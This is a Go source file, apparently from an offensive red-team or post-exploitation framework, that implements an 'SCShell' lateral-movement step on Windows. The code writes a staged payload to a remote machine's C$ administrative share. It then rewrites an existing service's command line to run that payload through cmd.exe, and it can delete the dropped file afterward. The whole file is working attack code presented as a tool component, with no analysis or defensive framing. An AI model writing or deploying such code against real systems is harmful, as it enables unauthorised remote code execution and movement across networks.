//go:build jump_scshell && windows

package core

import (
	"context"
	"fmt"
	"os"
)

func jumpSCShell(ctx context.Context, s *jumpSpec, name string) (string, error) {
	unc := fmt.Sprintf(`\\%s\C$\Windows\Temp\%s`, s.Target, name)
	if err := writeStage(s, unc); err != nil {
		return "", fmt.Errorf("copy to C$: %w", err)
	}
	remote := fmt.Sprintf(`cmd.exe /c C:\Windows\Temp\%s`, name)
	cmdline, err := scshellSwap(s.Target, s.Service, remote)
	if !s.NoCleanup {
		_ = os.Remove(unc)
	}
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("scshell: %s service=%s old=%q\n",
		s.Target, s.Service, cmdline), nil
}
